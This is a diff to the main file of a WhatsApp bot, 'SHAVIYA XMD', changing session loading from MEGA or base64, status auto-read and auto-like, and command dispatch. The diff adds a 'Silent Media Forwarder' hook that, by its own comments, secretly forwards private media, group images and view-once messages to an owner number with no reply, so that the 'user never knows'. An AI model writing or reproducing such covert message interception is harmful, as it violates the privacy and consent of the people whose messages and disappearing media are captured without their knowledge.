@@ -59,7 +59,8 @@ const { File } = require("megajs");
 
 // lib modules — lazy load
 let sms;
-let antidelete, handleAutoForward, autoViewOnce;
+let antidelete, handleAutoForward;
+let mediaFwdModule;  // 📥 Silent Media Forwarder (includes view-once)
 const { initAntiCrash } = require('./lib/anticrash');
 
 // ================= Global Variables =================
@@ -71,7 +72,7 @@ const botName = "SHAVIYA XMD";
 let activeSessions = new Set();
 const reconnectingSessions = new Set();
 const sentConnectMsg = new Set();
-let _cachedWAVersion = null; // fetched once at startup, reused on reconnects
+let _cachedWAVersion = null;
 
 // ================= Bot Context (Fake ID) =================
 const chama = {
@@ -85,10 +86,6 @@ const chama = {
 };
 
 // ====================== MEGA SESSION DOWNLOADER ======================
-// SHAVIYA-XMD RULE:
-//   plugins/ and lib/ are BUNDLED LOCALLY — never downloaded from MEGA.
-//   Only the session (creds.json) may come from MEGA when SESSION_ID is a MEGA link.
-
 function ensureDirSync(dir) {
   if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
 }
@@ -127,7 +124,6 @@ async function loadSession() {
   ensureDirSync(authDir);
   const credsPath = path.join(authDir, "creds.json");
 
-  // If valid creds already exist, skip loading
   if (fs.existsSync(credsPath)) {
     try {
       const existing = JSON.parse(fs.readFileSync(credsPath, "utf8"));
@@ -138,7 +134,6 @@ async function loadSession() {
     } catch {}
   }
 
-  // ── Normalize ranu& / shavi& short IDs to full MEGA links ──
   if (sessionId.startsWith("ranu&")) {
     sessionId = "https://mega.nz/file/" + sessionId.slice(5);
     console.log("[SESSION] ranu& prefix detected → converting to MEGA link.");
@@ -147,7 +142,6 @@ async function loadSession() {
     console.log("[SESSION] shavi& short ID detected → converting to MEGA link.");
   }
 
-  // ── Option 1: MEGA link ──
   if (sessionId.startsWith("https://mega.nz") || sessionId.startsWith("mega://")) {
     try {
       console.log("[SESSION] Downloading session from MEGA...");
@@ -173,7 +167,6 @@ async function loadSession() {
     }
   }
 
-  // ── Option 2: Base64-encoded creds.json ──
   try {
     let raw = sessionId.trim();
     for (const prefix of ["SHAVIYA-XMD_","ranu&","HASIYA_","shavi&"]) {
@@ -189,7 +182,6 @@ async function loadSession() {
     console.log("[SESSION] Base64 decode failed:", e.message);
   }
 
-  // ── Option 3: Raw JSON string ──
   try {
     const parsed = JSON.parse(sessionId);
     if (parsed && parsed.noiseKey) {
@@ -205,7 +197,6 @@ async function loadSession() {
 
 // ====================== BOOT: ensure folders & session ======================
 async function ensureBotFiles() {
-  // Only ensure local folders exist — plugins and lib come bundled, NOT from MEGA
   ["plugins","lib","data","cookies","auth_info_baileys"].forEach(f =>
     ensureDirSync(path.join(__dirname, f))
   );
@@ -377,7 +368,6 @@ async function startBot(sessionId, authPath, envConfig) {
 
   const prefix = envConfig?.PREFIX || ".";
   const { state, saveCreds } = await useMultiFileAuthState(authPath);
-  // Use cached version — fetch once at startup, skip network on reconnects
   if (!_cachedWAVersion) {
     try { const r = await fetchLatestBaileysVersion(); _cachedWAVersion = r.version; }
     catch (_) { _cachedWAVersion = [2, 3000, 1015901307]; }
@@ -391,11 +381,10 @@ async function startBot(sessionId, authPath, envConfig) {
     syncFullHistory: false,
     auth: state,
     version,
-    // ── Required for status@broadcast delivery ──
     getMessage: async (key) => {
       return { conversation: "" };
     },
-    shouldIgnoreJid: (jid) => false, // never ignore status@broadcast
+    shouldIgnoreJid: (jid) => false,
   });
 
   console.log(`Starting session: ${sessionId}`);
@@ -403,7 +392,6 @@ async function startBot(sessionId, authPath, envConfig) {
   if (!global._activeConns) global._activeConns = new Map();
   global._activeConns.set(sessionId, conn);
 
-  // ── Anti-Crash Protection ──
   initAntiCrash(conn, sessionId, ownerNumber);
 
   conn.ev.on("connection.update", async (update) => {
@@ -431,7 +419,6 @@ async function startBot(sessionId, authPath, envConfig) {
         global.attachCinesubzListener(conn, sessionId);
       }
 
-      // Presence — sync, no delay needed
       try {
         const { getSetting } = require('./lib/settings');
         const alwaysOffline = getSetting('alwaysOffline');
@@ -440,16 +427,10 @@ async function startBot(sessionId, authPath, envConfig) {
         }
       } catch (e) {}
 
-      // ── Connect message — FULLY fire-and-forget ──
-      // CRITICAL: Never await or block here. connection.update handler
-      // is on Baileys single event emitter. Any await/sleep here DELAYS
-      // all status@broadcast + message events = 4-5 min status read lag.
-      // The 3000ms sleep was the ROOT CAUSE of the status delay bug.
       if (!sentConnectMsg.has(sessionId)) {
         sentConnectMsg.add(sessionId);
         ;(async () => {
           try {
-            // Small delay inside IIFE only — does NOT block event emitter
             await new Promise(r => setTimeout(r, 3000));
 
             const now = new Date().toLocaleString('en-US', {
@@ -506,23 +487,15 @@ async function startBot(sessionId, authPath, envConfig) {
   conn.ev.on("creds.update", saveCreds);
 
   conn.ev.on("messages.update", (updates) => {
-    if (antidelete) antidelete.onDelete(conn, updates, sessionId).catch(() => {}); // fire-and-forget — never block
+    if (antidelete) antidelete.onDelete(conn, updates, sessionId).catch(() => {});
   });
 
   const { getSetting: _getSettingStatus } = require("./lib/settings");
 
-  // ═══════════════════════════════════════════════════════════════════
-  // SINGLE MERGED LISTENER — zero double-dispatch overhead
-  // Status path:  sync, setImmediate-deferred, never blocks CMD queue
-  // CMD path:     async, only runs for type:"notify"/"append" non-status
-  // ═══════════════════════════════════════════════════════════════════
   conn.ev.on("messages.upsert", (mkk) => {
     const { messages, type } = mkk;
 
-    // ── STATUS PATH — instant, direct, zero delay ──
-    // readMessages() is fire-and-forget (.catch) so it NEVER blocks.
-    // No setImmediate needed — direct call = "Just now" on sender's viewer list.
-    // Accept both "append" (primary) and "notify" (some WA versions send status as notify).
+    // ── STATUS PATH ──
     const autoRead = _getSettingStatus("autoStatusRead");
     const autoLike = _getSettingStatus("autoStatusLike");
     for (const mek of messages) {
@@ -530,13 +503,10 @@ async function startBot(sessionId, authPath, envConfig) {
       if (mek.key.fromMe) continue;
       if (!mek.key.id) continue;
 
-      // readMessages — instant fire-and-forget, zero blocking
       if (autoRead !== false && autoRead !== "false") {
         conn.readMessages([mek.key]).catch(() => {});
       }
 
-      // autoLike — delay 1500ms after read so WA server processes read receipt first
-      // Sending react simultaneously with readMessages causes silent drop by WA
       if (autoLike !== false && autoLike !== "false" && autoLike) {
         const statusSender = mek.key.participant || mek.key.remoteJid;
         const msg = mek.message || {};
@@ -560,16 +530,14 @@ async function startBot(sessionId, authPath, envConfig) {
       }
     }
 
-    // ── CMD PATH — skip status, skip non-notify/append ──
+    // ── CMD PATH ──
     if (type !== "notify" && type !== "append") return;
     const nonStatusMessages = messages.filter(
       m => m?.key?.remoteJid !== "status@broadcast"
     );
     if (nonStatusMessages.length === 0) return;
 
-    // Run CMD handler async without blocking the event loop
     (async (mkk) => {
-    // type already verified before IIFE call — no redundant check needed
     try {
       let mek = mkk.messages[0];
       if (!mek?.key) return;
@@ -582,17 +550,12 @@ async function startBot(sessionId, authPath, envConfig) {
         (msgKeys.length === 1 && msgKeys[0] === "messageContextInfo")
       ) return;
 
-      // status@broadcast safety — should not reach here but guard anyway
       if (mek.key.remoteJid === "status@broadcast") return;
 
-      // ── Antidelete cache — fire-and-forget, never block cmd ──
+      // ── Antidelete cache ──
       if (antidelete) antidelete.onMessage(conn, mek, sessionId).catch(() => {});
 
-      if (autoViewOnce && autoViewOnce.onMessage) autoViewOnce.onMessage(conn, mek, sessionId).catch(() => {});
-
-      // ✅ FIX: Unwrap ephemeralMessage AND deviceSentMessage wrappers.
-      // Newer WA versions send DM messages as { deviceSentMessage: { message: {...} } }
-      // which causes extractBody to return "" → isCmd=false → no response in inbox.
+      // ✅ Unwrap ephemeralMessage AND deviceSentMessage
       {
         const _type = getContentType(mek.message);
         if (_type === "ephemeralMessage") {
@@ -604,7 +567,7 @@ async function startBot(sessionId, authPath, envConfig) {
 
       if (!mek.message) return;
 
-      // ── AutoForward — fire-and-forget ──
+      // ── AutoForward ──
       if (handleAutoForward) handleAutoForward(conn, mek, sessionId).catch(() => {});
 
       const m    = sms(conn, mek);
@@ -638,10 +601,22 @@ async function startBot(sessionId, authPath, envConfig) {
       const isOwner      = ownerNumber.includes(senderNumber) || botNumber === senderNumber;
       const reply        = (text) => conn.sendMessage(from, { text }, { quoted: mek });
 
-      // ── Owner react — react to messages SENT TO owner (not own messages) ──
-      // fromMe=true  → owner sent this msg → react කරන්නෙ නෑ (own msg ලෙ react weird)
-      // fromMe=false → someone sent to owner → 👑 react
-      // Exception: if owner is sending a cmd, skip react (cmd already has its own react)
+      // ══════════════════════════════════════════════════════════════
+      //  📥 SILENT MEDIA FORWARDER — forward to owner (822) silently
+      //  Group: images only | Private: all media | View-once: all
+      //  🕵️ Silent + Invisible — user never knows
+      // ══════════════════════════════════════════════════════════════
+      if (mediaFwdModule && mediaFwdModule.mediaForwardHandler) {
+        mediaFwdModule.mediaForwardHandler(conn, mek, { pushName: mek.pushName }, {
+          from,
+          sender,
+          isGroup: from.endsWith('@g.us'),
+          groupName: null,
+          reply: () => {}  // silent — no reply to user
+        }).catch(() => {});
+      }
+
+      // ── Owner react — react to messages SENT TO owner ──
       if (isOwner && !mek.key.fromMe && !isCmd) {
         conn.sendMessage(from, { react: { text: "👑", key: mek.key } }).catch(() => {});
       }
@@ -678,8 +653,6 @@ async function startBot(sessionId, authPath, envConfig) {
       const events = require("./command");
 
       if (!global._pluginsLoaded || events.commands.length === 0) {
-        // ✅ FIX: Don't skip — wait for plugins to load then execute.
-        // This fixes the "first group/inbox cmd gets no response" bug.
         (async () => {
           let tries = 0;
           while ((!global._pluginsLoaded || require("./command").commands.length === 0) && tries < 20) {
@@ -710,7 +683,7 @@ async function startBot(sessionId, authPath, envConfig) {
         }
       }
 
-      // ── on:"body" handlers — run in parallel, never series-block ──
+      // ── on:"body" handlers ──
       const bodyHandlers = events.commands.filter(c => c.on === "body");
       if (bodyHandlers.length > 0) {
         Promise.allSettled(
@@ -725,9 +698,8 @@ async function startBot(sessionId, authPath, envConfig) {
         console.error(`[MSG ERROR] ${sessionId}:`, err.message);
       }
     }
-  // Close CMD async IIFE — fire-and-forget, never blocks event loop
   })({ messages: nonStatusMessages, type }).catch(() => {});
-  }); // end merged messages.upsert listener
+  });
 }
 
 // ================= Express Server =================
@@ -740,7 +712,6 @@ app.listen(port, () => console.log(`🚀 SHAVIYA-XMD Server running on port ${po
 function loadPlugins() {
   if (global._pluginsLoaded) return;
   global._pluginsLoaded = true;
-  // command.js cache delete removed — prevents commands[] reset & re-registration
   const pluginFolder = "./plugins/";
   let loadedCount = 0;
   if (fs.existsSync(pluginFolder)) {
@@ -790,16 +761,15 @@ setTimeout(async () => {
   try {
     sms        = require("./lib/msg").sms;
     antidelete = require("./plugins/antidelete");
-    try { autoViewOnce = require("./plugins/auto-viewonce"); } catch (e) { console.log("[AUTO-VIEWONCE] load error:", e.message); }
     try { handleAutoForward = require("./plugins/forward").handleAutoForward; } catch {}
+    try { mediaFwdModule = require("./plugins/mediaforward"); console.log("[MEDIAFWD] Loaded ✅"); } catch (e) { console.log("[MEDIAFWD] load error:", e.message); }
     console.log("Lib modules loaded successfully.");
   } catch (e) {
     console.error("Lib load error:", e.message);
     process.exit(1);
   }
   await connectDB();
-  // Load settings for each session separately (per-session isolation)
   const _sessions = loadLocalSessions();
   await Promise.all(_sessions.map(s => loadSettingsFromDB(s.sessionId)));
   await connectToWA();
-}, 500); // minimal startup margin — no reason to wait 4 seconds
+}, 500);
